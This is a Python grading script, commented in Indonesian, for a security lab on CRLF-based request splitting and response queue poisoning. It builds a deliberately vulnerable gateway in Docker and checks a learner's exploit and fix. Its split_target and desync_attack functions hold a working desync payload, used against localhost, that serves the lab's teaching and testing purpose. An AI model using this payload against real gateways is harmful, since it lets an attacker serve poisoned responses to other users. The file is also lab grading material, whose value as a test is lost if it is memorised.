#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 16.

Rantai: CRLF di request target -> gateway men-decode ala Nginx $uri ->
request splitting di upstream -> response queue poisoning di koneksi
keep-alive backend yang dipakai bersama, ala PortSwigger Research
"CRLF-Powered Desync Attacks" (2026).

  Gateway meneruskan request klien ke backend lewat satu koneksi
  keep-alive bersama. Request target di-URL-decode sebelum dibangun
  menjadi upstream request line; %0d%0a menjadi CRLF literal sehingga
  satu request klien terbelah menjadi dua request di backend. Respons
  request selundupan mengantre dan diberikan ke request berikutnya
  (korban).

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - GET / -> 200 "backend ok"; GET /echo?m=t -> 200 "echo:t"
      - serangan referensi (health): solutions/exploit.py mencetak
        STATUS: 200 dan POISONED: <marker>; marker teramati di respons
        korban (koneksi kedua)
      - exploit/exploit.py milik learner dijalankan -> mencetak
        STATUS: 200 dan POISONED: <marker>; verifier me-replay serangan
        dengan marker learner dan memastikan marker muncul di respons
        korban
  FASE 2 (dengan fix/): bangun ulang gateway dari fix/gateway, pastikan
      - request terbelah -> 400 (fail-closed), tidak ada yang diteruskan
      - korban berikutnya menerima respons bersih (tanpa marker)
      - fungsi normal utuh, termasuk karakter ter-encode non-CRLF

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/gateway/gateway.py identik byte-per-byte dengan
    gateway/gateway.py -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import os
import re
import shutil
import socket
import subprocess
import sys
import time
from http.client import HTTPConnection
from urllib.parse import quote

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
HEALTH_MARKER = "health16"
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def req(path, timeout=10):
    c = HTTPConnection(HOST, PORT, timeout=timeout)
    try:
        c.request("GET", path or "/")
        r = c.getresponse()
        return r.status, r.read()
    finally:
        c.close()


def read_response(sock, timeout=10):
    sock.settimeout(timeout)
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(65536)
        if not chunk:
            raise ConnectionError("koneksi ditutup")
        buf += chunk
    head = buf.split(b"\r\n\r\n")[0].decode("latin-1")
    cl = 0
    for ln in head.split("\r\n")[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            if k.strip().lower() == "content-length":
                cl = int(v.strip())
    total = len(buf.split(b"\r\n\r\n")[0]) + 4 + cl
    while len(buf) < total:
        chunk = sock.recv(65536)
        if not chunk:
            raise ConnectionError("koneksi ditutup")
        buf += chunk
    raw = buf[:total]
    status = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    return status, raw


def split_target(marker):
    inner = ("/ HTTP/1.1\r\nX-Pad: x\r\n\r\n"
             "GET /echo?m=%s HTTP/1.1\r\nHost: b\r\n\r\n" % marker)
    return quote(inner, safe="")


def desync_attack(marker, timeout=10):
    """Kirim request terbelah (penyerang), lalu GET / normal (korban).

    Mengembalikan (status_penyerang, status_korban, body_korban).
    """
    a = socket.create_connection((HOST, PORT), timeout=timeout)
    try:
        a.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\n"
                   "Connection: keep-alive\r\n\r\n"
                   % (split_target(marker), HOST)).encode("latin-1"))
        status_a, _ = read_response(a, timeout)
    finally:
        a.close()
    v = socket.create_connection((HOST, PORT), timeout=timeout)
    try:
        v.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"
                   % HOST.encode("latin-1"))
        status_v, raw_v = read_response(v, timeout)
    finally:
        v.close()
    return status_a, status_v, raw_v


def reference_attack():
    exp = os.path.join(LAB_DIR, "solutions", "exploit.py")
    p = subprocess.run([sys.executable, exp], capture_output=True,
                       text=True, timeout=120, cwd=os.path.dirname(exp))
    return p.returncode, p.stdout or "", p.stderr or ""


def parse_exploit_output(out):
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_pois = re.search(r"^POISONED:\s*(\S+)\s*$", out, re.MULTILINE)
    return ((m_status.group(1) if m_status else None),
            (m_pois.group(1) if m_pois else None))


def valid_marker(m):
    return bool(m) and re.fullmatch(r"[A-Za-z0-9_-]{1,64}", m)


def wait_up(timeout=180):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, body = req("/")
            if st == 200 and b"backend ok" in body:
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, body = req("/")
    check("baseline: GET / -> 200 backend ok", st == 200 and b"backend ok" in body,
          "dapat %s" % st)
    st, body = req("/echo?m=t")
    check("fungsi normal: GET /echo?m=t -> 200 echo:t",
          st == 200 and b"echo:t" in body, "dapat %s" % st)

    log("== [HEALTH] serangan referensi: CRLF -> request splitting -> queue poisoning ==")
    rc, out, err = reference_attack()
    status, poisoned = parse_exploit_output(out)
    ok_ref = (rc == 0 and status == "200" and valid_marker(poisoned))
    check("serangan referensi: STATUS 200 + POISONED termati di korban",
          ok_ref, "dapat rc=%s status=%r poisoned=%r" % (rc, status, poisoned))
    if not ok_ref:
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        log("stderr: %s" % (err[-1500:] if err else "-"))
        compose_down()
        sys.exit(1)

    log("== FASE 1: reset ke pristine segar untuk exploit learner ==")
    compose_down()
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=120, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 120 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    status, poisoned = parse_exploit_output(p.stdout or "")
    check("exploit mencetak STATUS: 200", status == "200",
          "dapat %r" % status)
    check("exploit mencetak POISONED (alfanumerik)", valid_marker(poisoned),
          "dapat %r" % poisoned)

    # Exploit learner sudah mengotori antrean respons backend; reset dulu
    # agar replay berjalan di atas antrean bersih (deterministik).
    log("== FASE 1: reset ke pristine segar untuk replay ==")
    compose_down()
    run_compose(["up", "-d"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    ok_pois = False
    if valid_marker(poisoned):
        try:
            _, st_v, body_v = desync_attack(poisoned)
            ok_pois = (" 200 " in st_v
                       and ("echo:" + poisoned).encode("latin-1") in body_v)
        except (OSError, ConnectionError) as e:
            log("replay gagal: %s" % e)
    check("POISONED terbukti: marker muncul di respons korban",
          ok_pois, "dapat teracuni=%s" % ok_pois)

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "gateway", "gateway.py")
    fixed = os.path.join(LAB_DIR, "fix", "gateway", "gateway.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/gateway/gateway.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    try:
        st_a, st_v, body_v = desync_attack(HEALTH_MARKER)
    except (OSError, ConnectionError) as e:
        log("serangan referensi gagal dieksekusi: %s" % e)
        compose_down()
        sys.exit(1)
    check("serangan referensi GAGAL: request terbelah -> 400",
          " 400 " in st_a, "dapat %r" % st_a)
    check("serangan referensi GAGAL: korban terima respons bersih",
          " 200 " in st_v and b"backend ok" in body_v
          and HEALTH_MARKER.encode("latin-1") not in body_v,
          "dapat %r marker_ikut=%s" % (st_v, HEALTH_MARKER.encode() in body_v))

    st, body = req("/")
    check("fungsi normal: GET / -> 200 backend ok",
          st == 200 and b"backend ok" in body, "dapat %s" % st)
    st, body = req("/echo?m=%41%42")
    check("fungsi normal: karakter ter-encode non-CRLF tetap diteruskan",
          st == 200 and b"echo:AB" in body, "dapat %s body=%r" % (st, body[:20]))

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
